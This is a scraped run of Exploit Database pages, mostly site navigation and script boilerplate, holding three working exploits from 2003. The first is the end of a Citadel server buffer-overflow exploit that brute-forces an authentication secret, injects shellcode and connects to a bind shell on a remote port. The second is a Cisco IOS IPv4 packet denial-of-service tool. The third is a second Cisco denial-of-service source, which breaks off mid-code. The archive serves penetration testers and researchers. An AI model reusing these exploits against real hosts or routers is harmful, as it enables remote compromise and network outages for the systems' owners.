lets each worker thread// in Citserver copy the shellcode into a buffer, making it almost// certain that we can jump to it successfully (it hasn't failed once!)// Shellcode is stored in a buffer that is used by Citserver to hold// text that would normally get logged to stderr. As Citserver usually// runs as a daemon, this exploit doesn't show in any logs at all.increase_chances(sock,magic);// Enter configuration import mode, specifically the 'floor' section,// although I think others may be vulnerable tooprintf("[-] Entering config mode ...\n");my_send(sock, "ARTV import\n");my_recv(sock);my_send(sock, "floor\n");// Start the vulnerable import process which blindly reads in 6 lines of// data. These lines are read into buffers 4K in size, and the data is// also truncated at 4K... Unfortunately, the 3rd line goes into a 256// byte buffer which, of course, overflows..printf("[-] Sending exploit strings ...\n");my_send(sock, "a\n");my_send(sock, "a\n");// Overflow occurs when this buffer is read by the server, so make sure// it's padded to the correct size with the evil RET address tagged on// the end.make_exploitbuf(buf);my_send(sock,buf);// Send the final 3 lines of text. It can be anything we like...make_shellcode(buf);for(i=0;i<3;i++)my_send(sock,buf);// The server will now have RETurned to the new, malicious saved EIP and// is executing the shellcode... We close the connection, wait a couple of// seconds and then connect to the shell which is bound to port 45295.close(sock);printf("[-] Waiting before connecting to shell...\n");sleep(2);printf("[-] Now connecting to shell...\n");if(!(sock=connect_to_host(host,SHELL_PORT))) {return SHELL_NOT_FOUND;}printf("[-] Connected! You can type commands now:\n");// Now let the attacker issue commands to the remote// shell, just as if (s)he had launched 'nc host 45295'.do {FD_ZERO(&rfds);FD_SET(0, &rfds);FD_SET(sock, &rfds);retVal=select(sock+1, &rfds, NULL, NULL, NULL);if(retVal) {if(FD_ISSET(sock, &rfds)) {buf[(r=recv(sock, buf, SIZ-1,0))]='\0'; // bad!printf("%s", buf);}if(FD_ISSET(0, &rfds)) {buf[(r=read(0, buf, SIZ-1))]='\0'; // bad!send(sock, buf, strlen(buf), 0);}}} while(retVal && r); // loop until connection terminates// Be an environmentally friendly programmer and free resources before exiting...close(sock);return 1;}// Given a hostname (or IP address) and a port number, this function// connects a TCP stream and returns a socket number (or dies trying)int connect_to_host(char *h, int p) {int sock,tmp=1;struct hostent *host;struct sockaddr_in saddr;if((host=gethostbyname(h))==NULL) {return HOST_NOT_RESOLVED;}if((sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))==-1) {return SOCKET_ERR;}memset((void *)&saddr, 0, sizeof(struct sockaddr_in));saddr.sin_family=AF_INET;saddr.sin_addr.s_addr=*((unsigned long *)host->h_addr_list[0]);saddr.sin_port=htons(p);if(connect(sock, (struct sockaddr *)&saddr, sizeof(saddr))<0) {return CONNECT_ERR;}// We want this to stop bad buffering on fast networks... TCP_NODELAY seems// to fix strange and intermittent buffering issues on some test boxes,// especially when coupled with 'local net' mode ( See 'help' in usage() ).if(setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, (void *)&tmp, sizeof(tmp))!=0) {return NODELAY_ERR;}return sock;}// This will brute-force the secret IPGM (Internal ProGraM) authentication// code for the Citadel server. The IPGM secrets are determined at install// time and use a very weak random number generator that creates precisely// reproducable 'random' numbers. By default, this brute-forcer is setup to// try about 29990 32-bit 'secret' numbers... it's overkill but catches 100%// of Citadel installations tested so far.// Returns IPGM secret number if successful, -1 if not.// Note: This could be a lot more efficient... but seeing as this is a public// release, better not make it _too_ efficient, eh?int brute_force(int s) {char buf[SIZ];int exitFlag=0, randomNum;// Loop through each seed and try the random number...seed=SEED_START;while(!exitFlag && seed<=SEED_MAX) {printf("[-] Bruteforcing ... %d of %d\r", seed, SEED_MAX);fflush(stdout);srand(seed);my_send(s, "IPGM %d\n", (randomNum=rand()));memset(buf,0,SIZ-1);LOCAL_NET();recv(s, buf, SIZ-1, 0);if(!strncmp(buf, "200",3))exitFlag=1;seed++;}printf("                                                               \r");// Return the magic number to the caller if successful.// Note: we have already been successfully IPGM authenticated,// so no need to do it again in the calling function.if(exitFlag)return randomNum;elsereturn -1;}// Fairly standard function to fill a buffer with LEN bytes of padding,// followed by the RET address to overwrite saved EIP with. An extra non-// printable character is added at the end of the buffer because the Citadel// server will convert the last non-printable character in a buffer to NULL.void make_exploitbuf(char *b) {int l;memset(b,0x00,SIZ-1);memset(b,'a',LEN+bufLenAdjust);l=strlen(b);b[l]=retAddr&0xff;b[l+1]=(retAddr&0xff00)>>8;b[l+2]=(retAddr&0xff0000)>>16;b[l+3]=(retAddr&0xff000000)>>24;// make sure there is a non-printable char _after_ the RET address, because the server// will replace the last non-printable char with a NULL... we don't want our RET NULLified!strcat(b, "_\x01\n");}// Pad out the shellcode buffer with NOPs to make it easier to hit the// shellcode when the server RETurns from the vulnerable function. Again,// a non-printable char is added to the end of the buffer.void make_shellcode(char *b) {int l;memset(b,0,SIZ-1);memset(b,0x90,SIZ-40); // 40 is arbitrary - enough room for IPGM xxxxxxxxxxmemcpy(b+(SIZ-42)-strlen(shellcode), shellcode, strlen(shellcode));strcat(b,"\x01"); // nonprintable chaar}// Handy little function to send formattable data down a socket.void my_send(int s, char *b, ...) {va_list ap;char *buf;va_start(ap,b);vasprintf(&buf,b,ap);send(s,buf,strlen(buf),0);va_end(ap);free(buf);}// Another handy function to read data from a socket.void my_recv(int s) {int len;char buf[SIZ];LOCAL_NET();len=recv(s, buf, SIZ-1, 0);buf[len]=0;// do stuff with buf[] here...//printf("%s");}// No prizes for guessing what this does....// Note: this style of multi-line text strings is deprecated and won't compile// under GCC 3.3 - I don't care.void usage(void) {printf("Citadel Exploit - Public Release VersionBy Carl Livitt (carllivitt at hush dot com)Flags:-t target	Attack host 'target'-l		Use 'local net' mode: adds small pausesbetween send() and recv() calls. Has morechance of succeding on fast networks-i number	Specify IPGM number if known - avoidsdoing brute force discovery-s nanosecs	Sleep for 'nanosecs' when in local net modedefault: 100000-r address	Specify RET address-a adjustment	Add 'adjustment' to RET address-A adjustment	Subtract 'adjustment' to RET address-o adjustment	Add 'adjustment' to overflow buffer length-O adjustment	Subtract 'adjustment' from overflow buffer length-b number	Start bruteforce srand() seed at 'number'-B number	End bruteforce srand() seed at 'number'-n number	Attempt the exploit 'number' times-S seconds	Sleep for 'seconds' between exploit attempts-h		You're reading it.");}// Wrapper for nanosleep()... just pass 'n' nanoseconds to it.void my_sleep(int n) {t.tv_sec=0;t.tv_nsec=n;nanosleep(&t,&t);}// Flood the citadel server CHANCE_COUNTER times with the shellcode// to try and make it more likely for the shellcode to be in the right// place at the right time. This function makes one helluva difference// to the exploits reliability (100% reliable to date).void increase_chances(int s, int m) {char buf[SIZ];int i;make_shellcode(buf);for(i=0;i<CHANCE_COUNTER;i++) {my_send(s, "IPGM %d %s\n", m, buf);my_recv(s);}}// milw0rm.com [2003-07-17]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPort142122232542495366697079808110210511011111311912313513914316116216438338940240641144344444544650250451351451553254855455561762363165568978378780887388890199810001040108910991100111411201194123514711521153315811589160416171723174317611812185818611900194720002022204921002103212121252181224223152375238023812401248025252640281028122947295429903000303030503052312831293181320032173306333333783389346034653500353536323690379038143817400040024070408141054111432243434434450145554592466147504848500050605061508050815093515151805247525052725308543254665554555556005655566658005803581458585900598460666070608060826101611261296379650265036660666770017002707070717080710071447210727272907426744375107547764977707777777877877879790280008001800280048008802080228023802880308080808180828088809081818300840084438445847385008585861988008812883988808888900090019002908090909091910091249200925192569443944797849788985598769900998799939999100001000110080102021020310443106161100011211114601220312221123451239712401133271370113722138381699218821188811900019810198132000020010200312011120171220032342325672260002701527700280153000030303313373240032674327643420537215377773784838292400074152344334468244808049152500005049652311527895286952986534135434554890555545555556380577725808062514TagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 59
Cisco IOS - IPv4 Packets Denial of Service - Hardware dos Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDCisco IOS - IPv4 Packets Denial of ServiceEDB-ID:59CVE:2003-0567EDB Verified:Author:l0cKType:dosExploit:/Platform:HardwareDate:2003-07-18Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/** ShadowChode - Cisco IOS IPv4 Packet Processing Denial of Service Exploit** Ping target router/switch for TTL to host. Subtract that number from 255* and use that TTL on the command line. The TTL must equal 0 or 1 when it* reaches the target. The target must accept packets to the given target* interface address and there are some other caveats.** BROUGHT TO YOU BY THE LETTERS C AND D** [L0cK]*/#include <stdio.h>#include <sys/types.h>#include "libnet.h"#define MIN_PAYLOAD_LEN (26)#define CLEANUP { \libnet_destroy(lh); \free(payload); \}intmain(int argc, char *argv[]){char errbuf[LIBNET_ERRBUF_SIZE];libnet_t *lh;u_long dst_addr;int ttl;int payload_len;char *payload;libnet_ptag_t data_tag;libnet_ptag_t ip_tag;int i;int len;int protocols[] = { 53, 55, 77, 103 };struct libnet_stats ls;lh = libnet_init(LIBNET_RAW4, NULL, errbuf);if (lh == NULL) {(void) fprintf(stderr, "libnet_init() failed: %s\n", errbuf);exit(-1);}if (argc != 3 || (dst_addr = libnet_name2addr4(lh, argv[1], LIBNET_RESOLVE) == -1)) {(void) fprintf(stderr, "Usage: %s <target> <ttl>\n", argv[0]);libnet_destroy(lh);exit(-1);}{ /* OH WAIT, ROUTE'S RESOLVER DOESN'T WORK! */struct in_addr dst;if (!inet_aton(argv[1], &dst)) {perror("inet_aton");libnet_destroy(lh);exit(-1);}dst_addr = dst.s_addr;}ttl = atoi(argv[2]);libnet_seed_prand(lh);len = libnet_get_prand(LIBNET_PR8);/* Mmmmm, suck up random amount of memory! */payload_len = (MIN_PAYLOAD_LEN > len) ? MIN_PAYLOAD_LEN : len;payload = (char *) malloc(payload_len);if (payload == NULL) {perror("malloc");libnet_destroy(lh);exit(-1);}for (i = 0; i < payload_len; i++) {payload[i] = i;}data_tag = LIBNET_PTAG_INITIALIZER;data_tag = libnet_build_data(payload, payload_len, lh, data_tag);if (data_tag == -1) {(void) fprintf(stderr, "Can't build data block: %s\n", libnet_geterror(lh));CLEANUP;exit(-1);}ip_tag = LIBNET_PTAG_INITIALIZER;for (i = 0; i < 4; i++) {ip_tag = libnet_build_ipv4(LIBNET_IPV4_H + payload_len, 0, libnet_get_prand(LIBNET_PRu16),0, ttl, protocols[i], 0, libnet_get_prand(LIBNET_PRu32), dst_addr, NULL, 0, lh, ip_tag);if (ip_tag == -1) {(void) fprintf(stderr, "Can't build IP header: %s\n", libnet_geterror(lh));CLEANUP;exit(-1);}len = libnet_write(lh);if (len == -1) {(void) fprintf(stderr, "Write error: %s\n", libnet_geterror(lh));}}libnet_stats(lh, &ls);(void) fprintf(stderr, "Packets sent: %ld\n""Packet errors: %ld\n""Bytes written: %ld\n",ls.packets_sent, ls.packet_errors, ls.bytes_written);CLEANUP;return (0);}// milw0rm.com [2003-07-18]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 60
Cisco IOS - 'cisco-bug-44020.c' IPv4 Packet Denial of Service - Hardware dos Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDCisco IOS - 'cisco-bug-44020.c' IPv4 Packet Denial of ServiceEDB-ID:60CVE:2003-0567EDB Verified:Author:Martin KlugeType:dosExploit:/Platform:HardwareDate:2003-07-21Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/*******************************************************//* cisco-bug-44020.c - Copyright by Martin Kluge (martin@elxsi.de) *//*                                                                                            *//* Feel free to modify this code as you like, as long as you include *//* the above copyright statement.                                               *//*                                                                                            *//* Please use this code only to check your OWN cisco routers.         *//*                                                                                            *//*                                                                                            *//* This exploit uses the bug in recent IOS versions to stop router    *//* from processing traffic once the input queue is full.                    *//*                                                                                            *//*                                                                                            *//* Use access control lists as described in the CISCO advisory to     *//* protect your cisco routers:                                                       *//*                                                                                            *//* access-list 101 deny 53 any any                                              *//* access-list 101 deny 55 any any                                              *//* access-list 101 deny 77 any any                                              *//* access-list 101 deny 103 any any                                            *//*                                                                                            *//* This code was only tested on linux, no warranty is or will be        *//*                                                                                            *//* Usage: ./cisco-bug-44020 <src ip> <dst ip> <hops> <number>  *//* Source IP: Your source IP (or a spoofed source IP)                    *//* Destination IP: The IP of the vulnerable cisco router                  *//* Hops: The number of hops between you and the router,             *//* the time to live (ttl) should be 0 when the packet                      *//* is received by the cisco router.                                                 *//* Number: Number of packets to send (0 = loop)                         *//* provided.                                                                              *//*******************************************************/#include <stdio.h>#include <stdlib.h>#include <string.h>#include <unistd.h>#include <arpa/inet.h>#include <netinet/in.h>#include <sys/time.h>#include <sys/types.h>#include <sys/socket.h>#define DEBUG#ifndef IPPROTO_RAW#define IPPROTO_RAW 0#endif/* IPv4 header */struct ipv4_pkt_header {unsigned int ipvhl:8; /* Version + Header length */unsigned int type_service:8; /* TOS(Type of Service) field */unsigned short packet_len; /* Header+Payload length */unsigned short ident; /* Identification field */unsigned short fragment; /* Fragment Offset field */unsigned int time_live:8; /* TTL(Time to Live) field */unsigned int protocol:8; /* Protocol field */unsigned short sum; /* Checksum field */struct in_addr src_ip; /* Source IP */struct in_addr dst_ip; /* Destination IP */};char proto[] = {53,55,77,103};/* Prototypes */int in_cksum (unsigned short *, int, int);/* Main function */int main (int argc, char *argv[]) {struct ipv4_pkt_header ipv4_hdr;struct sockaddr_in sin;struct timeval seed;unsigned long src_ip, dst_ip;int fd, hops, count, bytes;int len=0, i=0, n=0, loop=0;unsigned char *buf;/* Check command line args */if(argc != 5) {fprintf(stderr, "Usage: %s <src ip> <dst ip> <hops> <number>\n\n", argv[0]);return(EXIT_FAILURE);}src_ip = inet_addr(argv[1]);dst_ip = inet_addr(argv[2]);hops = atoi(argv[3]);count = atoi(argv[4]);if(count == 0) { loop=1; count=1; }#ifdef DEBUGprintf("DEBUG: Hops: %i\n", hops);#endif/* Open a raw socket */if((fd = socket(AF_INET, 